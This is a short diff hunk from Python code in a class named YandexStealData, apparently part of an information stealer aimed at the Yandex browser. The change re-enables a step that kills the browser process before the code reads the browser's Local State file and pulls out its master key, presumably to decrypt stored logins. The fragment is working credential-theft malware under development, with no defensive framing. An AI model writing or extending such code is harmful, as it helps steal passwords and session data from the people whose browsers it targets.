@@ -17,7 +17,7 @@ class YandexStealData:
 
         if not os.path.exists(local_state_file_path):
             return
-        # self.kill_yandex()
+        self.kill_yandex()
         
         self.master_key_and_profile: dict[str, bytes] = get_yandex_master_key(local_state_file_path)
         
